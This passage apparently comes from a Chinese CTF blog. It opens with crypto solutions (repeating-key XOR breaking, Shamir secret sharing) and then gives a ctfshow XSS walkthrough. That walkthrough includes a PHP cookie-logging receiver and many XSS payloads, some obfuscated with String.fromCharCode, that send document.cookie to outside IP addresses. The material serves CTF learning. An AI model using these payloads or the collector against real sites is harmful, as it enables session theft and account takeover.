=1e5d4c055104471c6f234f5501555b5a014e5d001c2a54470555064c443e235b4c0e590356542a130a4242335a47551a590a136f1d5d4d440b0956773613180b5f184015210e4f541c075a47064e5f001e2a4f711844430c473e2413011a100556153d1e4f45061441151901470a196f035b0c4443185b322e130806431d5a072a46385901555c5b550a541c1a2600564d5f054c453e32444c0a434d43182a0b1c540a55415a550a5e1b0f613a5c1f10021e56773a5a0206100852063c4a18581a1d15411d17111b052113460850104c472239564c0755015a13271e0a55553b5a47551a54010e2a06130b5506005a393013180c100f52072a4a1b5e1b165d50064e411d0521111f235f114c47362447094f10035c066f19025402191915110b4206182a544702100109133e394505175509671b6f0b01484e06505b061b50034a2911521e44431b5a233f13180b5508131523050154403740415503484f0c2602564d470a18407b775d031110004a54290319544e06505b060b424f092e1a770443101952333213030d554d551b2006064206555d50141c454f0c3d1b5e4d43061e453e39544c17580856581802001102105443101d111a043c03521455074c473f3213000a5b085d113c194f5e08555415180f5f433e270d131d420c1957773f560d11440d40543c060e470b55545b114e470e193c155f4d47110947343f13180c100f565a000403484e184c15050250081f2a54470545104c5536251325435302461a3b4a02484e12545c1b4265070b3b5440055543185b36231301025b084054220f4f42071b1554020f430b196f19564d4002055d79</span><br></pre></td></tr></table></figure><p>去掉salt层后，就只剩下plain和key了，key就是我们要求的flag，这里我们注意到key的位数小于38位，所以使用key来循环异或加密的，对于利用重复密钥异或的情况，我们有现成的脚本Break repeating-key XOR，原理为汉明距离hamming_distance</p><p>例子</p><ul><li>“karolin”   and “kathrin” is 3.</li><li>“karolin”   and “kerstin” is 3.</li><li>1011101 and 1001001 is   2.</li><li>2173896 and 2233796 is   3.</li></ul><blockquote><p><strong>汉明距离（Hamming Distance）</strong> 是衡量两个字符串（或两个二进制数）之间的差异的度量。它表示的是两个字符串（或二进制数）中相同位置上不同字符的个数。简而言之，它就是计算两个字符串中对应字符不同的位置的数量。</p><p>或者</p><p><strong>hamming_distance</strong>：在信息论中表示两个等长字符串在对应位置上不同字符的数目 以d(x, y)表示字符串x和y之间的汉明距离 简单来说 汉明距离度量了通过替换字符的方式将字符串x变成y所需要的最小的替换次数</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line"></span><br><span class="line">no_salt =<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;1e5d4c055104471c6f234f5501555b5a014e5d001c2a54470555064c443e235b4c0e590356542a130a4242335a47551a590a136f1d5d4d440b0956773613180b5f184015210e4f541c075a47064e5f001e2a4f711844430c473e2413011a100556153d1e4f45061441151901470a196f035b0c4443185b322e130806431d5a072a46385901555c5b550a541c1a2600564d5f054c453e32444c0a434d43182a0b1c540a55415a550a5e1b0f613a5c1f10021e56773a5a0206100852063c4a18581a1d15411d17111b052113460850104c472239564c0755015a13271e0a55553b5a47551a54010e2a06130b5506005a393013180c100f52072a4a1b5e1b165d50064e411d0521111f235f114c47362447094f10035c066f19025402191915110b4206182a544702100109133e394505175509671b6f0b01484e06505b061b50034a2911521e44431b5a233f13180b5508131523050154403740415503484f0c2602564d470a18407b775d031110004a54290319544e06505b060b424f092e1a770443101952333213030d554d551b2006064206555d50141c454f0c3d1b5e4d43061e453e39544c17580856581802001102105443101d111a043c03521455074c473f3213000a5b085d113c194f5e08555415180f5f433e270d131d420c1957773f560d11440d40543c060e470b55545b114e470e193c155f4d47110947343f13180c100f565a000403484e184c15050250081f2a54470545104c5536251325435302461a3b4a02484e12545c1b4265070b3b5440055543185b36231301025b084054220f4f42071b1554020f430b196f19564d4002055d79&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bxor</span>(<span class="params">a, b</span>):<span class="comment"># xor two byte strings of different lengths</span></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(a) &gt; <span class="built_in">len</span>(b):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a[:<span class="built_in">len</span>(b)], b)])</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b[:<span class="built_in">len</span>(a)])])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hamming_distance</span>(<span class="params">b1, b2</span>):</span><br><span class="line">    differing_bits =<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bxor(b1, b2):</span><br><span class="line">        differing_bits += <span class="built_in">bin</span>(byte).count(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> differing_bits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">score</span>(<span class="params">s</span>):</span><br><span class="line">   freq = &#123;&#125;</span><br><span class="line">   freq[<span class="string">&#x27; &#x27;</span>] = <span class="number">700000000</span></span><br><span class="line">   freq[<span class="string">&#x27;e&#x27;</span>] = <span class="number">390395169</span></span><br><span class="line">   freq[<span class="string">&#x27;t&#x27;</span>] = <span class="number">282039486</span></span><br><span class="line">   freq[<span class="string">&#x27;a&#x27;</span>] = <span class="number">248362256</span></span><br><span class="line">   freq[<span class="string">&#x27;o&#x27;</span>] = <span class="number">235661502</span></span><br><span class="line">   freq[<span class="string">&#x27;i&#x27;</span>] = <span class="number">214822972</span></span><br><span class="line">   freq[<span class="string">&#x27;n&#x27;</span>] = <span class="number">214319386</span></span><br><span class="line">   freq[<span class="string">&#x27;s&#x27;</span>] = <span class="number">196844692</span></span><br><span class="line">   freq[<span class="string">&#x27;h&#x27;</span>] = <span class="number">193607737</span></span><br><span class="line">   freq[<span class="string">&#x27;r&#x27;</span>] = <span class="number">184990759</span></span><br><span class="line">   freq[<span class="string">&#x27;d&#x27;</span>] = <span class="number">134044565</span></span><br><span class="line">   freq[<span class="string">&#x27;l&#x27;</span>] = <span class="number">125951672</span></span><br><span class="line">   freq[<span class="string">&#x27;u&#x27;</span>] = <span class="number">88219598</span></span><br><span class="line">   freq[<span class="string">&#x27;c&#x27;</span>] = <span class="number">79962026</span></span><br><span class="line">   freq[<span class="string">&#x27;m&#x27;</span>] = <span class="number">79502870</span></span><br><span class="line">   freq[<span class="string">&#x27;f&#x27;</span>] = <span class="number">72967175</span></span><br><span class="line">   freq[<span class="string">&#x27;w&#x27;</span>] = <span class="number">69069021</span></span><br><span class="line">   freq[<span class="string">&#x27;g&#x27;</span>] = <span class="number">61549736</span></span><br><span class="line">   freq[<span class="string">&#x27;y&#x27;</span>] = <span class="number">59010696</span></span><br><span class="line">   freq[<span class="string">&#x27;p&#x27;</span>] = <span class="number">55746578</span></span><br><span class="line">   freq[<span class="string">&#x27;b&#x27;</span>] = <span class="number">47673928</span></span><br><span class="line">   freq[<span class="string">&#x27;v&#x27;</span>] = <span class="number">30476191</span></span><br><span class="line">   freq[<span class="string">&#x27;k&#x27;</span>] = <span class="number">22969448</span></span><br><span class="line">   freq[<span class="string">&#x27;x&#x27;</span>] = <span class="number">5574077</span></span><br><span class="line">   freq[<span class="string">&#x27;j&#x27;</span>] = <span class="number">4507165</span></span><br><span class="line">   freq[<span class="string">&#x27;q&#x27;</span>] = <span class="number">3649838</span></span><br><span class="line">   freq[<span class="string">&#x27;z&#x27;</span>] = <span class="number">2456495</span></span><br><span class="line"></span><br><span class="line">   score = <span class="number">0</span></span><br><span class="line">   string=<span class="built_in">bytes</span>.decode(s)</span><br><span class="line">   <span class="keyword">for</span> c <span class="keyword">in</span> string.lower():</span><br><span class="line">       <span class="keyword">if</span> c <span class="keyword">in</span> freq:</span><br><span class="line">            score += freq[c]</span><br><span class="line">   <span class="keyword">return</span> score</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">break_single_key_xor</span>(<span class="params">b1</span>):</span><br><span class="line">    max_score = <span class="number">0</span></span><br><span class="line">    english_plaintext = <span class="number">0</span></span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        b2 = [i]* <span class="built_in">len</span>(b1)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            plaintext = bxor(b1, b2)</span><br><span class="line">            pscore = score(plaintext)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> pscore &gt; max_score <span class="keyword">or</span> <span class="keyword">not</span> max_score:</span><br><span class="line">           max_score = pscore</span><br><span class="line">           english_plaintext = plaintext</span><br><span class="line">           key = <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">b = no_salt</span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line"></span><br><span class="line">   <span class="comment"># 我们取其中前6段计算平局汉明距离</span></span><br><span class="line"></span><br><span class="line">   b1 = b[: KEYSIZE]</span><br><span class="line">   b2 = b[KEYSIZE: KEYSIZE * <span class="number">2</span>]</span><br><span class="line">   b3 = b[KEYSIZE * <span class="number">2</span>: KEYSIZE * <span class="number">3</span>]</span><br><span class="line">   b4 = b[KEYSIZE * <span class="number">3</span>: KEYSIZE * <span class="number">4</span>]</span><br><span class="line">   b5 = b[KEYSIZE * <span class="number">4</span>: KEYSIZE * <span class="number">5</span>]</span><br><span class="line">   b6 = b[KEYSIZE * <span class="number">5</span>: KEYSIZE * <span class="number">6</span>]</span><br><span class="line">   b7 = b[KEYSIZE * <span class="number">6</span>: KEYSIZE * <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">   normalized_distance = <span class="built_in">float</span>(</span><br><span class="line">      hamming_distance(b1, b2) +</span><br><span class="line">      hamming_distance(b2, b3) +</span><br><span class="line">      hamming_distance(b3, b4) +</span><br><span class="line">      hamming_distance(b4, b5) +</span><br><span class="line">      hamming_distance(b5, b6) </span><br><span class="line">   ) / (KEYSIZE * <span class="number">5</span>)</span><br><span class="line">   normalized_distances.append(</span><br><span class="line">      (KEYSIZE, normalized_distance)</span><br><span class="line">   )</span><br><span class="line"></span><br><span class="line">normalized_distances = <span class="built_in">sorted</span>(normalized_distances, key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE, _ <span class="keyword">in</span> normalized_distances[:<span class="number">5</span>]:</span><br><span class="line">   block_bytes = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(KEYSIZE)]</span><br><span class="line">   <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">   keys = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> bbytes <span class="keyword">in</span> block_bytes:</span><br><span class="line">        keys += break_single_key_xor(bbytes)</span><br><span class="line">   key = <span class="built_in">bytearray</span>(keys * <span class="built_in">len</span>(b), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">   plaintext = bxor(b, key)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;keysize:&quot;</span>, KEYSIZE)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;key is:&quot;</span>, keys, <span class="string">&quot;n&quot;</span>)</span><br><span class="line">   s = <span class="built_in">bytes</span>.decode(plaintext)</span><br><span class="line">   <span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503102208453.png" alt="image-20250310220753348" loading="lazy"></p><p>参考</p><p><a href="https://www.jianshu.com/p/ecd767d9af0d">https://www.jianshu.com/p/ecd767d9af0d</a></p><p><a href="https://links.jianshu.com/go?to=https://www.anquanke.com/post/id/161171">小记一类ctf密码题解题思路 </a></p><p> <a href="https://links.jianshu.com/go?to=https://xz.aliyun.com/t/3256%23toc-22">https://xz.aliyun.com/t/3256#toc-22</a></p><p> <a href="https://links.jianshu.com/go?to=https://cypher.codes/writing/cryptopals-challenge-set-1">https://cypher.codes/writing/cryptopals-challenge-set-1</a></p><p> <a href="https://links.jianshu.com/go?to=https://cryptopals.com/sets/1/challenges/6">https://cryptopals.com/sets/1/challenges/6</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&mid=2247484089&idx=1&sn=3f41f1d65595f47dc72918b22cffc128&chksm=fd7117f4ca069ee292d6bbabe37d5aa9445747d0c13dd8b2d2f1d274f7afa32f910fe28ff07e&mpshare=1&scene=23&srcid=&sharer_sharetime=1565101436270&sharer_shareid=0a12e40935fbeb4e04dfab7ff42aca93#rd">https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247484089&amp;idx=1&amp;sn=3f41f1d65595f47dc72918b22cffc128&amp;chksm=fd7117f4ca069ee292d6bbabe37d5aa9445747d0c13dd8b2d2f1d274f7afa32f910fe28ff07e&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1565101436270&amp;sharer_shareid=0a12e40935fbeb4e04dfab7ff42aca93#rd</a></p><h4 id="羊城杯-2020-GMC（二次剩余和勒让德符号）"><a href="#羊城杯-2020-GMC（二次剩余和勒让德符号）" class="headerlink" title="[羊城杯 2020]GMC（二次剩余和勒让德符号）"></a>[羊城杯 2020]GMC（二次剩余和勒让德符号）</h4><h4 id="De1CTF2019-Babylfsr-B-M算法"><a href="#De1CTF2019-Babylfsr-B-M算法" class="headerlink" title="[De1CTF2019]Babylfsr(B-M算法)"></a>[De1CTF2019]Babylfsr(B-M算法)</h4><p>参考：<a href="https://ctf-wiki.org/crypto/streamcipher/fsr/lfsr/#b-m">ctfwiki</a></p><h4 id="UTCTF2020-Curveball（Shamir秘密共享算法）"><a href="#UTCTF2020-Curveball（Shamir秘密共享算法）" class="headerlink" title="[UTCTF2020]Curveball（Shamir秘密共享算法）"></a>[UTCTF2020]Curveball（Shamir秘密共享算法）</h4><p>Shamir秘密共享算法基本原理</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507241103589.png" alt="image-20250724110310401" loading="lazy"></p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507241131729.png" alt="image-20250724113125617" loading="lazy"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(C81E728D9D4C2F636F067F89CC14862C, 31E96A93BF1A7CE1872A3CCDA6E07F86)</span><br><span class="line">(ECCBC87E4B5CE2FE28308FD9F2A7BAF3, ADF6E4F1052BDE978344743CCDCF5771)</span><br><span class="line">(E4DA3B7FBBCE2345D7772B0674A318D5, 0668FBCFE4098FEA0218163AC21E6531)</span><br></pre></td></tr></table></figure><p>题目中的三组数据为md5加密后的数据，md5解密得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(2,5398141)</span><br><span class="line">(3,5398288)</span><br><span class="line">(5,5398756)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以用sage在有限域上解密 exp.sage</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">x_0,y_0 = (2,5398141)</span><br><span class="line">x_1,y_1 = (3,5398288)</span><br><span class="line">x_2,y_2 = (5,5398756)</span><br><span class="line">R.&lt;x&gt; = QQ[]</span><br><span class="line">l_0 = ((x-x_1)/(x_0-x_1))*((x-x_2)/(x_0-x_2))</span><br><span class="line">l_1 = ((x-x_0)/(x_1-x_0))*((x-x_2)/(x_1-x_2))</span><br><span class="line">l_2 = ((x-x_0)/(x_2-x_0))*((x-x_1)/(x_2-x_1))</span><br><span class="line">f_x = (y_0*l_0) + （y_1*l_1） + （y_2*l_2）</span><br><span class="line">print(f_x)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">29*x^2 + 2*x + 5398021</span><br></pre></td></tr></table></figure><p>但5398021不是flag，那只能是txt行数，我们在5398021看到flag</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/5b011611a86ccd031604a199941fff21.png" alt="在这里插入图片描述" loading="lazy"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;网鼎杯-2020-青龙组-you-raise-me-up（大步小步算法）&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-青龙组-you-raise-me-up（大步小步算法）&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 青龙组]you_ra</summary>
      
    
    
    
    <category term="密码笔记" scheme="https://kinseyy.github.io/categories/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="crypto" scheme="https://kinseyy.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow xss</title>
    <link href="https://kinseyy.github.io/2025/04/22/ctfshow-xss/"/>
    <id>https://kinseyy.github.io/2025/04/22/ctfshow-xss/</id>
    <published>2025-04-22T12:35:07.000Z</published>
    <updated>2025-05-19T11:02:25.285Z</updated>
    
    <content type="html"><![CDATA[<h3 id="反射型-非持久化"><a href="#反射型-非持久化" class="headerlink" title="反射型(非持久化)"></a>反射型(非持久化)</h3><p>（1）原理<br>  反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p><p>（2）攻击方式<br>  攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞</p><h3 id="web-316"><a href="#web-316" class="headerlink" title="web-316"></a>web-316</h3><p>反射型xss</p><p>我们利用vps进行外带</p><p>先往vps里写入一个1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$time</span>.<span class="string">&#x27;:    &#x27;</span>. <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后用js语句进行外带</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href=&quot;http://60.204.158.87/123/2.php?cookie=&quot;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>此外，也可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&#x27;http://60.204.158.87/123/2.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://60.204.158.87/123/2.php?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">&lt;script&gt;window.open(&#x27;http://60.204.158.87/123/2.php?cookie=&#x27;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="web-317"><a href="#web-317" class="headerlink" title="web-317"></a>web-317</h3><p>这题把script进行了过滤，我们使用img标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; οnerrοr=location.href=&quot;http://60.204.158.87/123/2.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure><h3 id="web-318"><a href="#web-318" class="headerlink" title="web-318"></a>web-318</h3><p>我们试试script和img标签，都没有回显</p><p>而我们输入<code>&lt;body&gt;alert(1)&lt;/body&gt;</code>有回显</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504222107410.png" alt="image-20250422210717305" loading="lazy"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;body οnlοad=location.href=&quot;http://60.204.158.87/123/2.php?cookie=&quot;+document.cookie&gt;</span><br><span class="line">&lt;body onload=&quot;document.location.href=&#x27;http://60.204.158.87/123/2.php?cookie=&#x27;+document.cookie&quot;&gt;&lt;/body&gt;</span><br><span class="line">&lt;body onload=&quot;document.location.href=&#x27;http://60.204.158.87/123/2.php?cookie=&#x27;+document.cookie&quot;&gt;</span><br><span class="line">&lt;iframe οnlοad=document.location=&#x27;http://60.204.158.87/123/2.php?cookie=&#x27;+document.cookie&gt;</span><br></pre></td></tr></table></figure><h3 id="web-319"><a href="#web-319" class="headerlink" title="web-319"></a>web-319</h3><p>同318</p><h3 id="web-320"><a href="#web-320" class="headerlink" title="web-320"></a>web-320</h3><p>经过测试，他过滤了空格，script，img</p><p>xss中空格可以用%09,&#x2F;**&#x2F;,&#x2F;,tab代替</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/**/οnlοad=location.href=&quot;http://60.204.158.87/123/2.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure><p>扩展：String.formCharCode函数</p><p>他可以将ascii码转字符</p><p>String.fromCharCode(111,110,108,111,97,100); 控制台运行结果如下：</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504222141737.png" alt="image-20250422214141614" loading="lazy"></p><p>用它可以构造一个payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/**/οnlοad=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,50,48,46,52,54,46,52,49,46,49,55,51,47,74,97,121,49,55,47,49,50,55,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,60,47,115,99,114,105,112,116,62));&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(***)`就是`&lt;script&gt;document.location.href=&#x27;http://120.46.41.173/Jay17/127.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>下面是字符串转ascii码脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;请输入字符串: &quot;</span>)  <span class="comment"># 获取用户输入的字符串</span></span><br><span class="line">ascii_list = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历字符串，将每个字符转换为ASCII码，并添加到列表中</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> input_str:</span><br><span class="line">    ascii_code = <span class="built_in">ord</span>(char)  <span class="comment"># 使用ord()函数获取字符的ASCII码</span></span><br><span class="line">    ascii_list.append(<span class="built_in">str</span>(ascii_code))  <span class="comment"># 将ASCII码转换为字符串并添加到列表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将列表中的ASCII码用逗号隔开，并打印结果</span></span><br><span class="line">result = <span class="string">&#x27;,&#x27;</span>.join(ascii_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的ASCII码:&quot;</span>, result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ascii转字符串</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ascii_to_string</span>(<span class="params">ascii_str</span>):</span><br><span class="line">    <span class="comment"># 将以逗号分隔的ASCII码字符串分割成一个列表</span></span><br><span class="line">    ascii_list = ascii_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用列表推导式将ASCII码转换为字符，并连接成一个字符串</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(code)) <span class="keyword">for</span> code <span class="keyword">in</span> ascii_list)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入以逗号分隔的ASCII码字符串</span></span><br><span class="line">ascii_str = <span class="built_in">input</span>(<span class="string">&quot;请输入以逗号分隔的ASCII码字符串: 